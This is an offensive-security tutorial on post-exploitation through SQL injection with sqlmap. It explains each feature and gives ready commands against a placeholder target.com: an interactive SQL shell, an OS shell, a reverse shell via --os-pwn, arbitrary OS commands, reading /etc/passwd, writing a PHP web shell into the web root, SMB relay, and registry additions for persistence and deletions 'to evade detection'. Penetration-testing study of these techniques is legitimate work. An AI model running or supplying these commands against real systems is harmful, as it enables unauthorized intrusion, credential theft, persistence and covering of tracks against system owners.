---
title: Master Shell Access Techniques Using Sqlmap
description: 'Learn to gain shell access via Sqlmap for post-exploitation tasks: OS
  command execution, file operations, registry manipulations, and more.'
keywords:
- Shell Access
- SQL Injection
- Sqlmap
- OS Command Execution
- File Operations
- Registry Manipulation
- Post-Exploitation
- SQL Shell
- OS Shell
- SMB Relay Techniques
---

# Shell Access

## Context

The objective of this guide is to teach you how to gain shell access using Sqlmap for various post-exploitation tasks. This guide assumes you are familiar with the basic mechanisms of shell access, the fundamentals of SQL injection, and command execution techniques.

## Theory

### SQL Shell Usage

The SQL Shell feature of Sqlmap provides an interactive environment for executing SQL queries on a database. By using the `--sql-shell` option, you can directly interact with the database, allowing you to issue queries to extract information or manipulate the underlying data structure.

### OS Shell Access

OS Shell Access enables you to execute operating system commands on the target server through a SQL injection vulnerability. The `--os-shell` option in Sqlmap facilitates this by using the SQL injection vulnerability to gain command-line access to the target's operating system.

### OS Pwn Exploitation

OS Pwn is a feature that uses automated methods to gain a reverse shell on the target system. By using the `--os-pwn` option, Sqlmap attempts to establish a reverse shell connection, which can be used for deeper system access and further exploration.

### OS Command Execution

OS Command Execution relies on the ability to run arbitrary operating system commands through the exploitation of a SQL injection vulnerability. Sqlmap's `--os-cmd` option allows specific OS commands to be executed, enabling various post-exploitation actions.

### File Read Operations

File Read Operations involve accessing and extracting file contents from the target system. With the `--file-read` parameter, Sqlmap can retrieve files, providing entry to sensitive data if files of interest are accessible.

### File Write Operations

File Write Operations allow you to write or modify files on the target system, potentially altering configurations or implanting malicious files. This is facilitated through the `--file-write` option, specifying the source file and its destination on the target.

### OS SMB Relay Techniques

SMB Relay Techniques exploit the SMB protocol to gain unauthorized access. Sqlmap's `--os-smbrelay` option allows you to leverage this method, potentially leading to privilege escalation on the target network.

### Registry Read Operations

Registry Read Operations involve reading Windows registry keys. This can reveal critical system information and configuration. Utilizing `--reg-read`, sensitive registry data can be extracted from the target system.

### Registry Add Operations

Registry Add Operations allow you to introduce new entries into the Windows registry. Using the `--reg-add` option, you can write new keys, aiding persistence mechanisms or configuration changes on the target machine.

### Registry Delete Operations

Registry Delete Operations involve removing entries from the Windows registry, which can be useful for defense evasion or removing traces. The `--reg-del` option facilitates the deletion of specific registry keys as part of post-exploitation efforts.

## Practice

### SQL Shell Usage

- Use the following command to launch an interactive SQL shell:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --sql-shell
  ```
- This allows you to execute SQL queries directly on the database.

### OS Shell Access

- Execute OS commands via SQL injection using:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --os-shell
  ```
- This provides direct command-line access to the target system.

### OS Pwn Exploitation

- Automatically establish a reverse shell with:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --os-pwn
  ```
- This automates reverse shell connection to the target.

### OS Command Execution

- Run specific OS commands using:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --os-cmd="ls -la"
  ```
- This executes the intended OS command and retrieves output.

### File Read Operations

- Extract file contents from the target system by:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --file-read=/etc/passwd
  ```
- This accesses and displays the contents of specified files.

### File Write Operations

- Modify or inject files on the target system:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --file-write=./local_file --file-dest=/var/www/html/shell.php
  ```
- This writes or modifies files at chosen locations.

### OS SMB Relay Techniques

- Exploit the SMB protocol to gain access with:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --os-smbrelay
  ```
- This approach uses SMB relaying to escalate privileges.

### Registry Read Operations

- Read registry keys from a Windows system:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --reg-read="HKEY_LOCAL_MACHINE\\Software\\MyKey"
  ```
- This retrieves and displays the values for the given registry key.

### Registry Add Operations

- Add entries to the registry using:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --reg-add="HKEY_LOCAL_MACHINE\\Software\\NewKey" --reg-value="sample_value"
  ```
- This introduces new keys into the Windows registry.

### Registry Delete Operations

- Delete registry keys to evade detection:
  ```bash
  sqlmap -u http://target.com/vulnerable_page.php --reg-del="HKEY_CURRENT_USER\\Software\\OldKey"
  ```
- This command removes unwanted registry entries from the Windows system.

## Tools

- **sqlmap**